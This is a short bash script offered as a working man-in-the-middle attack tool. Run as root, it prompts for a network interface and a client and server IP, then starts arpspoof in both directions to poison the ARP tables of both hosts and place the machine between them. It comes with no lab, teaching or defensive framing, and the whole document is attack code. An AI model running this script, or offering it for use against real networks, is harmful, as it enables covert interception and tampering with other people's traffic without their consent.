#!/bin/bash

# Check if running as root (since arpspoof needs sudo)
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root (use sudo)." >&2
    exit 1
fi

# Ask for Interface, Client IP, and Server IP
read -p "Enter network INTERFACE: " interface
read -p "Enter CLIENT IP: " client_ip
read -p "Enter SERVER IP: " server_ip

# Check if arpspoof is installed
if ! command -v arpspoof &> /dev/null; then
    echo "Error: arpspoof not found. Install dsniff first:"
    echo "sudo apt install dsniff"
    exit 1
fi

# Start ARP spoofing in both directions
echo "Starting ARP spoofing on interface $interface between $client_ip (CLIENT) and $server_ip (SERVER)..."
echo "Press Ctrl+C to stop."

# Spoof Client (tell Client we are Server)
arpspoof -i "$interface" -t "$client_ip" -r "$server_ip" &
pid1=$!

# Spoof Server (tell Server we are Client)
arpspoof -i "$interface" -t "$server_ip" -r "$client_ip" &
pid2=$!

# Wait for Ctrl+C to stop
trap 'kill $pid1 $pid2; echo "ARP spoofing stopped."' SIGINT
wait
